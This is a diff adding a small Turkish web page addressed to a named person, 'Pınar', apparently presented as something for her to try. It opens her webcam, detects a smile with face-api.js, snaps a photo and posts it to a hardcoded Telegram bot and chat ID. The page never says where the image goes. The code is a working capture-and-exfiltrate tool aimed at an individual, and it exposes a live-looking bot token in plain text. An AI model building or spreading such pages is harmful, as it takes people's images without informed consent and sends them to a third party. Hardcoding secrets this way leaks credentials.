@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pınar İçin Deneme</title>
+    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <style>
+        body { 
+            margin: 0; 
+            background: #000; 
+            color: white; 
+            font-family: sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+        }
+        h1 { margin-bottom: 20px; color: #fff; font-size: 24px; }
+        #container { position: relative; width: 640px; height: 480px; }
+        video, canvas { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 640px; 
+            height: 480px; 
+        }
+        #status { margin-top: 20px; color: #00ff00; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <h1>Pınar şunu bi denesene</h1>
+    
+    <div id="container">
+        <video id="video" autoplay muted playsinline></video>
+    </div>
+
+    <div id="status">Sistem Hazırlanıyor...</div>
+
+    <script>
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+        
+        // --- AYARLARIN ---
+        const BOT_TOKEN = '8567641306:AAHz1V98pDTddIXVnBlf42Sjs4bI1_cAO64';
+        const USER_ID = '942073219';
+        // ------------------
+
+        let isLocked = false;
+
+        async function init() {
+            try {
+                const URI = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
+                await faceapi.nets.ssdMobilenetv1.loadFromUri(URI);
+                await faceapi.nets.faceExpressionNet.loadFromUri(URI);
+
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    status.innerText = "Hazır. Gülümseyince otomatik gönderir.";
+                    startLogic();
+                };
+            } catch (e) {
+                status.innerText = "Hata: Kameraya izin verin.";
+            }
+        }
+
+        function startLogic() {
+            const canvas = faceapi.createCanvasFromMedia(video);
+            document.getElementById('container').append(canvas);
+            const size = { width: 640, height: 480 };
+            faceapi.matchDimensions(canvas, size);
+
+            setInterval(async () => {
+                if (isLocked) return;
+
+                const detections = await faceapi.detectAllFaces(video).withFaceExpressions();
+                const resized = faceapi.resizeResults(detections, size);
+                
+                canvas.getContext('2d').clearRect(0, 0, 640, 480);
+                faceapi.draw.drawDetections(canvas, resized);
+
+                if (detections.length > 0) {
+                    const happy = detections[0].expressions.happy;
+                    if (happy > 0.85) {
+                        sendToTelegram();
+                    }
+                }
+            }, 100);
+        }
+
+        async function sendToTelegram() {
+            isLocked = true;
+            status.innerText = "Yakaladım! Gönderiliyor...";
+            
+            const capture = document.createElement('canvas');
+            capture.width = video.videoWidth;
+            capture.height = video.videoHeight;
+            // Görüntü üzerinde hiçbir oynama yapmadan (ayna vs yok) direkt çiziyoruz
+            capture.getContext('2d').drawImage(video, 0, 0);
+            
+            capture.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', USER_ID);
+                fd.append('photo', blob, 'image.jpg');
+                fd.append('caption', 'Pınar: Gülümseme algılandı.');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    status.innerText = "Başarıyla Gönderildi!";
+                } catch (err) {
+                    status.innerText = "Gönderim Hatası!";
+                }
+                
+                setTimeout(() => {
+                    isLocked = false;
+                    status.innerText = "Yeni çekim için hazır.";
+                }, 5000);
+            }, 'image/jpeg', 0.9);
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
